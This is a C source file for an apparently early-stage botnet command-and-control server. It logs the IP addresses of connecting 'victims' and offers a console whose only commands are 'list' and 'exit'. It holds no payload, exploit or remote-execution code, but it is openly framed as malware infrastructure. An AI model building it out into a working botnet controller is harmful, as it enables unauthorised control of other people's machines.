#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>

#define BANNER "######################\n"\
	"#        BOTNET       #\n" \
	"#                     #\n" \
	"#                     #\n" \
	"#######################\n"

#define TRUE 1
#define COMMAND_SIZE 100
/*The max length of an ipv4 address. Defined this way because an ipv4 is at max 4 3 digit numbers with 3 dots between them:
 * 255.255.255.255 plus one byte for good measure*/
#define IPV4_MAX_LEN 16
#define C2_PORT 12345
/*strlen("client connected") plus some extra bytes for good measure*/
#define MSG_LEN 20

/*The structure of a node from the victim ip addresses list*/
struct node {
	char addr[IPV4_MAX_LEN];
	struct node *next;
}; 

/*The head of the victim list*/
struct node *vic_list_head = NULL;

/*Inserts a node into the victim linked list*/
void insert_into_list(struct node *to_insert) {
	if (vic_list_head == NULL) {
		vic_list_head = to_insert;
	}
	else {
		struct node *prev = vic_list_head->next;
		vic_list_head->next = to_insert;
		to_insert->next = prev;
	}
}

/*Starts the C2 Status server*/
void *startServer(void *port) {
	int c2_sock, vic_sock;
	struct sockaddr_in c2_addr;
	int opt;
	char buf[MSG_LEN];

	/*Init socket*/
	if ((c2_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket");

		exit(1);
	}

	/*setsockopt*/
	if (setsockopt(c2_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
		perror("setsockopt");

		exit(1);
	}

	/*IPV4 ALL_ADDRESSES PORT*/
	c2_addr.sin_family = AF_INET;
	c2_addr.sin_addr.s_addr = INADDR_ANY;
	c2_addr.sin_port = htons(*(int *)port);

	/*bind*/
	if (bind(c2_sock, (struct sockaddr *)&c2_addr, sizeof(c2_addr)) < 0) {
		perror("bind");

		exit(1);
	}

	/*main loop*/
	while (1) {
		/*listen*/
		if (listen(c2_sock, 3) < 0) {
			perror("listen");

			exit(1);
		}

		int addr_len = sizeof(c2_addr);

		/*accept*/
		if ((vic_sock = accept(c2_sock, (struct sockaddr *)&c2_addr, (socklen_t*)&addr_len)) < 0) {
			perror("accept");

			exit(1);
		}

		/*read hello msg. Need to check if the message is indeed the client welcome message*/
		read(vic_sock, buf, MSG_LEN);
		
		socklen_t len;
		struct sockaddr_storage addr;

		/*Get IP address*/
		getpeername(vic_sock, (struct sockaddr *)&addr, &len);

		/*Initialize the node*/
		struct node *my_node = malloc(sizeof(struct node));
		
		memset(my_node->addr, 0, IPV4_MAX_LEN);
		my_node->next = NULL;
		
		struct sockaddr_in *addr_in = (struct sockaddr_in *)&addr;
		char ip[IPV4_MAX_LEN + 1];

		inet_ntop(AF_INET, &addr_in->sin_addr, ip, sizeof(ip));
		strncpy(my_node->addr, ip, IPV4_MAX_LEN);
	
		/*Add to the linked list*/
		insert_into_list(my_node);

		/*Close victim socket*/
		close(vic_sock);
	}
}

/*Traverse the linked list*/
void list_hosts() {
	struct node *p = vic_list_head;

	while (p != NULL) {
		printf("%s\tALIVE\n", p->addr);

		p = p->next;
	}
}

int main(int argc, char **argv) {
	/*Prints the banner*/
	printf(BANNER);

	/*Start server as a thread*/
	pthread_t tid;

	int port = C2_PORT;

	pthread_create(&tid, NULL, &startServer, &port);

	/*Main command receiving loop*/
	while (TRUE) {
		char buf[COMMAND_SIZE];

		/*fgets()ing the input*/	
		printf("C2>");
		fgets(buf, COMMAND_SIZE, stdin);

		/*Stripping the newline that the output of fgets contains*/
		buf[strlen(buf) - 1] = '\0';

		/*Comparing it to a list of known commands.*/
		if (!strcmp(buf, "list")) {
			list_hosts();
		}
		else if (!strcmp(buf, "exit")) {
			break;
		}
		else {
			printf("Command %s isn't implemented yet.\n", buf);
		}
	}

	return 0;
}
